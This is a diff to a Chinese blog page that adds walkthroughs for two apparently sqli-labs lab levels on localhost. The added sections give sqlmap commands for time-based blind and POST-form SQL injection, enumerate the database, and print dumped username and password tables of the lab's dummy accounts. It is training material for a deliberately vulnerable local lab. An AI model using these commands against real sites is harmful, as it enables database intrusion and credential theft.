@@ -36,7 +36,7 @@
         <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
             <span>📅 发布: 2025-12-25</span>
             <span style="margin: 0 15px;">|</span>
-            <span style="color: #007bff; font-weight: bold;">📝 更新: 2025-12-30</span>
+            <span style="color: #007bff; font-weight: bold;">📝 更新: 2026-01-02</span>
             
             
              <span style="margin: 0 15px;">|</span>
@@ -327,7 +327,56 @@
 <p><img src="/images/QQ20251230-204650.png" alt="alt text"></p>
 <p>Over！！！！！！</p>
 <hr>
-<h2 id="9：-1"><a href="#9：-1" class="headerlink" title="#9："></a>#9：</h2><hr>
+<h2 id="10："><a href="#10：" class="headerlink" title="#10："></a>#10：</h2><p><img src="/images/QQ20260102-160723.png" alt="alt text"></p>
+<p>直接sqlmap走起，去学一下语法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-10/?id=1&quot; \</span><br><span class="line">--batch \</span><br><span class="line">--technique=T \</span><br><span class="line">--time-sec=1 \</span><br><span class="line">--level=5 \</span><br><span class="line">--risk=3 \</span><br><span class="line">--tamper=space2comment \</span><br><span class="line">--dbs</span><br></pre></td></tr></table></figure>
+
+<p>得到security。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-10/?id=1&quot; \</span><br><span class="line">--batch \</span><br><span class="line">--technique=T \</span><br><span class="line">--time-sec=1 \</span><br><span class="line">--level=5 \</span><br><span class="line">--risk=3 \</span><br><span class="line">--tamper=space2comment \</span><br><span class="line">-D security \</span><br><span class="line">--tables</span><br></pre></td></tr></table></figure>
+
+<p>得到表。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-10/?id=1&quot; \</span><br><span class="line">--batch \</span><br><span class="line">--technique=T \</span><br><span class="line">--time-sec=1 \</span><br><span class="line">--level=5 \</span><br><span class="line">--risk=3 \</span><br><span class="line">--tamper=space2comment \</span><br><span class="line">-D security \</span><br><span class="line">-T users \</span><br><span class="line">--columns</span><br></pre></td></tr></table></figure>
+
+<p>得到列。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-10/?id=1&quot; \</span><br><span class="line">--batch \</span><br><span class="line">--technique=T \</span><br><span class="line">--time-sec=1 \</span><br><span class="line">--level=5 \</span><br><span class="line">--risk=3 \</span><br><span class="line">--tamper=space2comment \</span><br><span class="line">-D security \</span><br><span class="line">-T users \</span><br><span class="line">-C id,username,password \</span><br><span class="line">--dump</span><br></pre></td></tr></table></figure>
+
+<p>让sqlmap跑一会就出了，毕竟时间盲注，吃的就是时间。</p>
+<p>最后得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| 1  | Dumb     | Dumb       |</span><br><span class="line">| 2  | Angelina | I-kill-you |</span><br><span class="line">| 3  | Dummy    | p@ssword   |</span><br><span class="line">| 4  | secure   | crappy     |</span><br><span class="line">| 5  | stupid   | stupidity  |</span><br><span class="line">| 6  | superman | genious    |</span><br><span class="line">| 7  | batman   | mob!le     |</span><br><span class="line">| 8  | admin    | admin      |</span><br><span class="line">| 9  | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">[16:46:59] [INFO] table &#x27;`security`.users&#x27; dumped to CSV file &#x27;/home/yu/.local/share/sqlmap/output/localhost/dump/security/users.csv&#x27;</span><br><span class="line">[16:46:59] [INFO] fetched data logged to text files under &#x27;/home/yu/.local/share/sqlmap/output/localhost&#x27;</span><br><span class="line">[16:46:59] [WARNING] your sqlmap version is outdated</span><br><span class="line"></span><br><span class="line">[*] ending @ 16:46:59 /2026-01-02/</span><br></pre></td></tr></table></figure>
+
+<p>秒了。</p>
+<hr>
+<h2 id="11："><a href="#11：" class="headerlink" title="#11："></a>#11：</h2><p><img src="/images/QQ20260102-165208.png" alt="alt text"></p>
+<p>cool，新界面这块。</p>
+<p>抓个包看看。</p>
+<p><img src="/images/QQ20260102-165512.png" alt="alt text"></p>
+<p>可以看到参数为	uname&#x3D;???&amp;passwd&#x3D;???&amp;submit&#x3D;Submit</p>
+<p>方法为POST。</p>
+<p>去看看语法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-11/&quot; \</span><br><span class="line">  --data=&quot;uname=2&amp;passwd=2&amp;submit=Submit&quot; \</span><br><span class="line">  --batch \</span><br><span class="line">  --current-db</span><br></pre></td></tr></table></figure>
+
+<p>拿下数据库名security。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-11/&quot; \</span><br><span class="line">  --data=&quot;uname=2&amp;passwd=2&amp;submit=Submit&quot; \</span><br><span class="line">  --batch \</span><br><span class="line">  -D security \</span><br><span class="line">  --tables</span><br></pre></td></tr></table></figure>
+
+<p>拿下表名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[4 tables]</span><br><span class="line">+----------+</span><br><span class="line">| emails   |</span><br><span class="line">| referers |</span><br><span class="line">| uagents  |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>
+
+<p>再来一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-11/&quot; \</span><br><span class="line">  --data=&quot;uname=2&amp;passwd=2&amp;submit=Submit&quot; \</span><br><span class="line">  --batch \</span><br><span class="line">  -D security \</span><br><span class="line">  -T users \</span><br><span class="line">  --columns</span><br></pre></td></tr></table></figure>
+
+<p>同样这块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | int(3)      |</span><br><span class="line">| password | varchar(20) |</span><br><span class="line">| username | varchar(20) |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<p>最后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-11/&quot; \</span><br><span class="line">  --data=&quot;uname=2&amp;passwd=2&amp;submit=Submit&quot; \</span><br><span class="line">  --batch \</span><br><span class="line">  -D security \</span><br><span class="line">  -T users \</span><br><span class="line">  -C id,password,username \</span><br><span class="line">  --dump</span><br></pre></td></tr></table></figure>
+
+<p>Over。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="12："><a href="#12：" class="headerlink" title="#12："></a>#12：</h2><hr>
 <p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
 
         </div>
@@ -336,6 +385,6 @@
 
 </div>
 
-<script src="/js/main.js?v=1767337365559"></script>
+<script src="/js/main.js?v=1767344907097"></script>
 </body>
 </html>
